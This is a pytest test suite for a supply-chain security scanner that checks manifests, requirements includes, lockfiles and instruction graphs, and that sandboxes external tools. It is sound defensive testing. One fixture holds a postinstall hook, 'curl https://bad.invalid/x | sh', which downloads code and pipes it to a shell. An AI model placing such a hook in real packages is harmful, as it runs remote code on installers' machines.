from __future__ import annotations

import json
import os
import sys

import pytest

from clawlock.scanners import supply_chain
from clawlock.scanners.supply_chain import (
    build_instruction_graph,
    parse_package_json,
    scan_supply_chain,
)


def _make_symlink(source, target, *, directory: bool = False) -> None:
    try:
        target.symlink_to(source, target_is_directory=directory)
    except (NotImplementedError, OSError) as exc:
        pytest.skip(f"symlinks are unavailable in this test environment: {exc}")


def test_explicit_symlink_target_is_refused_and_incomplete(tmp_path):
    package = tmp_path / "package.json"
    package.write_text('{"dependencies":{"safe":"1.2.3"}}', encoding="utf-8")
    link = tmp_path / "manifest-link.json"
    _make_symlink(package, link)

    report = scan_supply_chain(link)

    assert report.complete is False
    assert not report.manifests
    assert any("symlink/reparse" in item for item in report.diagnostics)


def test_directory_symlink_is_not_followed_and_marks_inventory_incomplete(tmp_path):
    outside = tmp_path / "outside"
    outside.mkdir()
    (outside / "package.json").write_text(
        '{"scripts":{"postinstall":"curl https://bad.invalid/x | sh"}}',
        encoding="utf-8",
    )
    root = tmp_path / "root"
    root.mkdir()
    _make_symlink(outside, root / "linked", directory=True)

    report = scan_supply_chain(root)

    assert report.complete is False
    assert not report.manifests
    assert any("was not followed" in item for item in report.diagnostics)


def test_irrelevant_files_do_not_consume_manifest_candidate_budget(
    monkeypatch, tmp_path
):
    for index in range(20):
        (tmp_path / f"irrelevant-{index}.txt").write_text("ignored", encoding="utf-8")
    package = tmp_path / "package.json"
    package.write_text(
        json.dumps({"dependencies": {"safe": "1.2.3"}}), encoding="utf-8"
    )
    monkeypatch.setattr(supply_chain, "MAX_MANIFEST_FILES", 1)

    report = scan_supply_chain(tmp_path)

    assert report.complete
    assert report.manifests == [str(package)]


@pytest.mark.parametrize(
    ("constant", "value", "diagnostic"),
    [
        ("MAX_INVENTORY_VISITS", 1, "visit budget"),
        ("MAX_INVENTORY_BYTES", 1, "byte budget"),
        ("MAX_INVENTORY_SECONDS", -1.0, "time budget"),
    ],
)
def test_inventory_budget_exhaustion_is_explicit(
    monkeypatch, tmp_path, constant, value, diagnostic
):
    (tmp_path / "package.json").write_text(
        '{"dependencies":{"safe":"1.2.3"}}', encoding="utf-8"
    )
    (tmp_path / "another.txt").write_text("ignored", encoding="utf-8")
    monkeypatch.setattr(supply_chain, constant, value)

    report = scan_supply_chain(tmp_path)

    assert report.complete is False
    assert any(diagnostic in item for item in report.diagnostics)


def test_descriptor_reader_detects_name_swap(monkeypatch, tmp_path):
    manifest = tmp_path / "package.json"
    replacement = tmp_path / "replacement.json"
    manifest.write_text('{"dependencies":{"one":"1.0.0"}}', encoding="utf-8")
    replacement.write_text('{"dependencies":{"two":"2.0.0"}}', encoding="utf-8")
    real_open = supply_chain.os.open
    swapped = False

    def swapping_open(path, flags):
        nonlocal swapped
        if not swapped and os.path.normcase(os.fspath(path)) == os.path.normcase(
            str(manifest)
        ):
            swapped = True
            os.replace(replacement, manifest)
        return real_open(path, flags)

    monkeypatch.setattr(supply_chain.os, "open", swapping_open)

    report = parse_package_json(manifest)

    assert report.complete is False
    assert any(
        "changed while it was being opened" in item for item in report.diagnostics
    )


def test_instruction_root_symlink_is_refused(tmp_path):
    real_root = tmp_path / "real"
    real_root.mkdir()
    (real_root / "SKILL.md").write_text("safe", encoding="utf-8")
    linked_root = tmp_path / "linked-root"
    _make_symlink(real_root, linked_root, directory=True)

    graph = build_instruction_graph(linked_root, [linked_root / "SKILL.md"])

    assert graph.complete is False
    assert not graph.nodes
    assert any("symlink/reparse" in item for item in graph.diagnostics)


def test_local_instruction_symlink_is_refused_and_incomplete(tmp_path):
    real_child = tmp_path / "real-child.md"
    real_child.write_text("safe", encoding="utf-8")
    linked_child = tmp_path / "child.md"
    _make_symlink(real_child, linked_child)
    entry = tmp_path / "SKILL.md"
    entry.write_text("[child](child.md)", encoding="utf-8")

    graph = build_instruction_graph(tmp_path, [entry])

    assert graph.complete is False
    assert any(issue.rule_id == "SC-INSTR-SYMLINK-001" for issue in graph.issues)
    assert not any(
        node.content_hash for node in graph.nodes.values() if node.depth == 1
    )


def test_missing_local_instruction_is_fail_closed(tmp_path):
    entry = tmp_path / "SKILL.md"
    entry.write_text("[missing](missing.md)", encoding="utf-8")

    graph = build_instruction_graph(tmp_path, [entry])

    assert graph.complete is False
    assert any(issue.rule_id == "SC-INSTR-MISSING-001" for issue in graph.issues)


def test_remote_loader_error_and_url_credentials_are_redacted(tmp_path):
    password = "password-with-secret"
    token = "query-token-secret"
    loader_secret = "loader-exception-secret"
    entry = f"https://user:{password}@example.invalid/main.md?token={token}"

    def failing_loader(_url):
        raise RuntimeError(loader_secret)

    graph = build_instruction_graph(tmp_path, [entry], remote_loader=failing_loader)
    rendered = repr(graph)

    assert graph.complete is False
    assert password not in rendered
    assert token not in rendered
    assert loader_secret not in rendered
    assert "[REDACTED]" in rendered


def test_remote_content_respects_cumulative_byte_budget(tmp_path):
    entry = "https://example.invalid/main.md"

    graph = build_instruction_graph(
        tmp_path,
        [entry],
        remote_loader=lambda _url: b"x" * 9,
        max_bytes=8,
    )

    assert graph.complete is False
    assert not next(iter(graph.nodes.values())).content_hash
    assert any("remote loader failed" in item for item in graph.diagnostics)


def test_requirements_recursively_scans_hidden_include_and_constraint(tmp_path):
    constraints = tmp_path / "constraints"
    constraints.mkdir()
    (tmp_path / "requirements.txt").write_text(
        "-r hidden.in\n--constraint=constraints/versions.in\n", encoding="utf-8"
    )
    hidden = tmp_path / "hidden.in"
    hidden.write_text(
        "git+https://example.invalid/hidden.git#main&egg=hidden\n",
        encoding="utf-8",
    )
    constraint = constraints / "versions.in"
    constraint.write_text("urllib3==2.2.2\n", encoding="utf-8")

    report = scan_supply_chain(tmp_path)

    hidden_dep = next(dep for dep in report.dependencies if dep.name == "hidden")
    constraint_dep = next(dep for dep in report.dependencies if dep.name == "urllib3")
    assert hidden_dep.kind == "git" and hidden_dep.mutable
    assert hidden_dep.group == "requirements"
    assert constraint_dep.group == "constraints"
    assert str(hidden) in report.manifests
    assert str(constraint) in report.manifests
    assert any(issue.rule_id == "SC-DEP-MUTABLE-001" for issue in report.issues)


def test_requirements_include_escape_is_not_read(tmp_path):
    root = tmp_path / "root"
    root.mkdir()
    (tmp_path / "outside.in").write_text(
        "git+https://example.invalid/outside.git#main&egg=outside\n",
        encoding="utf-8",
    )
    requirements = root / "requirements.txt"
    requirements.write_text("-r ../outside.in\n", encoding="utf-8")

    report = supply_chain.parse_requirements(requirements)

    assert report.complete is False
    assert not report.dependencies
    assert any(
        issue.rule_id == "SC-REQ-INCLUDE-PATH-ESCAPE-001" for issue in report.issues
    )


def test_requirements_missing_include_is_incomplete(tmp_path):
    requirements = tmp_path / "requirements.txt"
    requirements.write_text("-r missing.in\n", encoding="utf-8")

    report = supply_chain.parse_requirements(requirements)

    assert report.complete is False
    assert any(issue.rule_id == "SC-REQ-INCLUDE-READ-001" for issue in report.issues)


def test_requirements_symlink_include_is_refused(tmp_path):
    real = tmp_path / "real.in"
    real.write_text("safe==1.0.0\n", encoding="utf-8")
    linked = tmp_path / "linked.in"
    _make_symlink(real, linked)
    requirements = tmp_path / "requirements.txt"
    requirements.write_text("-r linked.in\n", encoding="utf-8")

    report = supply_chain.parse_requirements(requirements)

    assert report.complete is False
    assert not report.dependencies
    assert any(issue.rule_id == "SC-REQ-INCLUDE-SYMLINK-001" for issue in report.issues)


def test_requirements_cycle_is_bounded_but_all_unique_files_are_scanned(tmp_path):
    first = tmp_path / "requirements.txt"
    second = tmp_path / "second.in"
    first.write_text("-r second.in\none==1.0.0\n", encoding="utf-8")
    second.write_text("-r requirements.txt\ntwo==2.0.0\n", encoding="utf-8")

    report = supply_chain.parse_requirements(first)

    assert {dep.name for dep in report.dependencies} == {"one", "two"}
    assert any(issue.rule_id == "SC-REQ-INCLUDE-CYCLE-001" for issue in report.issues)


@pytest.mark.parametrize(
    ("constant", "value", "expected"),
    [
        ("MAX_REQUIREMENTS_DEPTH", 0, "SC-REQ-INCLUDE-DEPTH-001"),
        ("MAX_REQUIREMENTS_FILES", 1, "file budget"),
        ("MAX_REQUIREMENTS_BYTES", 1, "byte analysis limit"),
    ],
)
def test_requirements_include_budgets_fail_closed(
    monkeypatch, tmp_path, constant, value, expected
):
    requirements = tmp_path / "requirements.txt"
    requirements.write_text("-r child.in\none==1.0.0\n", encoding="utf-8")
    (tmp_path / "child.in").write_text("two==2.0.0\n", encoding="utf-8")
    monkeypatch.setattr(supply_chain, constant, value)

    report = supply_chain.parse_requirements(requirements)

    assert report.complete is False
    assert expected in repr(report)


def test_remote_requirements_include_url_secrets_are_redacted(tmp_path):
    password = "requirements-password-secret"
    token = "requirements-query-secret"
    requirements = tmp_path / "requirements.txt"
    requirements.write_text(
        f"-r https://user:{password}@example.invalid/hidden.in?token={token}\n",
        encoding="utf-8",
    )

    report = supply_chain.parse_requirements(requirements)
    rendered = repr(report)

    assert report.complete is False
    assert password not in rendered
    assert token not in rendered
    assert "[REDACTED]" in rendered


def test_package_lock_audits_resolved_integrity_and_manifest_drift(tmp_path):
    password = "lock-password-secret"
    token = "lock-query-secret"
    (tmp_path / "package.json").write_text(
        json.dumps({"dependencies": {"demo": "^1.0.0", "missing": "1.0.0"}}),
        encoding="utf-8",
    )
    lockfile = tmp_path / "package-lock.json"
    lockfile.write_text(
        json.dumps(
            {
                "lockfileVersion": 3,
                "packages": {
                    "": {"dependencies": {"demo": "^2.0.0"}},
                    "node_modules/demo": {
                        "version": "2.0.0",
                        "resolved": (
                            f"http://user:{password}@registry.invalid/demo.tgz?token={token}"
                        ),
                    },
                    "node_modules/weak": {
                        "version": "1.0.0",
                        "resolved": "https://registry.invalid/weak.tgz",
                        "integrity": "sha1-YWJjZA==",
                    },
                    "node_modules/gitdep": {
                        "version": "git+https://example.invalid/repo.git#main",
                        "resolved": "git+https://example.invalid/repo.git#main",
                    },
                },
            }
        ),
        encoding="utf-8",
    )

    report = scan_supply_chain(tmp_path)
    rule_ids = {issue.rule_id for issue in report.issues}
    rendered = repr(report)

    assert {
        "SC-LOCK-RESOLVED-CREDENTIAL-001",
        "SC-LOCK-RESOLVED-HTTP-001",
        "SC-LOCK-INTEGRITY-MISSING-001",
        "SC-LOCK-INTEGRITY-WEAK-001",
        "SC-LOCK-RESOLVED-MUTABLE-001",
        "SC-LOCK-MANIFEST-DRIFT-001",
    } <= rule_ids
    assert password not in rendered
    assert token not in rendered


def test_package_lock_accepts_strong_integrity_and_matching_root(tmp_path):
    (tmp_path / "package.json").write_text(
        json.dumps({"dependencies": {"demo": "^1.0.0"}}), encoding="utf-8"
    )
    (tmp_path / "package-lock.json").write_text(
        json.dumps(
            {
                "lockfileVersion": 3,
                "packages": {
                    "": {"dependencies": {"demo": "^1.0.0"}},
                    "node_modules/demo": {
                        "version": "1.2.3",
                        "resolved": "https://registry.invalid/demo.tgz",
                        "integrity": "sha512-YWJjZA==",
                    },
                },
            }
        ),
        encoding="utf-8",
    )

    report = scan_supply_chain(tmp_path)
    lock_dep = next(dep for dep in report.dependencies if dep.ecosystem == "npm-lock")

    assert report.complete
    assert lock_dep.pinned and not lock_dep.mutable
    assert not any(issue.rule_id.startswith("SC-LOCK-") for issue in report.issues)


def test_external_tool_discovery_refuses_current_directory_and_relative_path(
    monkeypatch, tmp_path
):
    target = tmp_path / "scan-target"
    target.mkdir()
    executable_name = "clawlock-untrusted-osv"
    suffix = ".exe" if os.name == "nt" else ""
    local_tool = tmp_path / f"{executable_name}{suffix}"
    local_tool.write_bytes(b"not a trusted executable")
    if os.name != "nt":
        local_tool.chmod(0o755)
    monkeypatch.chdir(tmp_path)
    monkeypatch.setenv("PATH", f".{os.pathsep}relative-bin")

    result = supply_chain.run_osv_scanner(target, executable=executable_name)

    assert result.complete is False
    assert not result.command
    assert result.status in {"unavailable", "refused"}


def test_external_tool_inside_analysis_target_is_refused(tmp_path):
    target = tmp_path / "scan-target"
    target.mkdir()
    local_tool = target / ("osv-scanner.exe" if os.name == "nt" else "osv-scanner")
    local_tool.write_bytes(b"not trusted")
    if os.name != "nt":
        local_tool.chmod(0o755)

    result = supply_chain.run_osv_scanner(target, executable=str(local_tool))

    assert result.status == "refused"
    assert result.complete is False
    assert "analysis target" in result.diagnostics[0]


@pytest.mark.parametrize(("stream", "status_text"), [(1, "stdout"), (2, "stderr")])
def test_external_tool_streams_have_hard_output_limits(
    monkeypatch, stream, status_text
):
    monkeypatch.setattr(supply_chain, "EXTERNAL_TOOL_MAX_STDOUT_BYTES", 1024)
    monkeypatch.setattr(supply_chain, "EXTERNAL_TOOL_MAX_STDERR_BYTES", 1024)
    script = f"import os; os.write({stream}, b'x' * 4096)"

    payload, result = supply_chain._execute_json_tool(
        "bounded-test", sys.executable, ("-c", script)
    )

    assert payload is None
    assert result.status == "output_limit"
    assert result.complete is False
    assert status_text in result.diagnostics[0]


def test_external_tool_timeout_terminates_and_is_incomplete(monkeypatch):
    monkeypatch.setattr(supply_chain, "EXTERNAL_TOOL_TIMEOUT_SECONDS", 0.1)

    payload, result = supply_chain._execute_json_tool(
        "timeout-test",
        sys.executable,
        ("-c", "import time; time.sleep(5)"),
    )

    assert payload is None
    assert result.status == "timeout"
    assert result.complete is False


def test_external_tool_stderr_is_never_returned(monkeypatch):
    secret = "external-tool-stderr-secret"
    script = (
        "import os; "
        "os.write(1, b'{}'); "
        f"os.write(2, bytes.fromhex({secret.encode().hex()!r})); "
        "raise SystemExit(2)"
    )

    payload, result = supply_chain._execute_json_tool(
        "stderr-test", sys.executable, ("-c", script)
    )

    assert payload == {}
    assert result.complete is False
    assert secret not in repr(result)


@pytest.mark.parametrize(
    ("runner", "payload"),
    [
        (supply_chain.run_osv_scanner, {"unexpected": []}),
        (supply_chain.run_gitleaks, {"unexpected": []}),
    ],
)
def test_external_tool_unexpected_json_schema_is_incomplete(
    monkeypatch, tmp_path, runner, payload
):
    tool_path = str((tmp_path.parent / "trusted-tool").resolve())
    monkeypatch.setattr(
        supply_chain,
        "_resolve_external_executable",
        lambda _name, _target: (tool_path, ""),
    )
    monkeypatch.setattr(
        supply_chain.subprocess,
        "run",
        lambda *_args, **_kwargs: type(
            "Completed",
            (),
            {"returncode": 0, "stdout": json.dumps(payload), "stderr": ""},
        )(),
    )

    result = runner(tmp_path)

    assert result.status == "error"
    assert result.complete is False
    assert "unexpected JSON schema" in result.diagnostics[0]
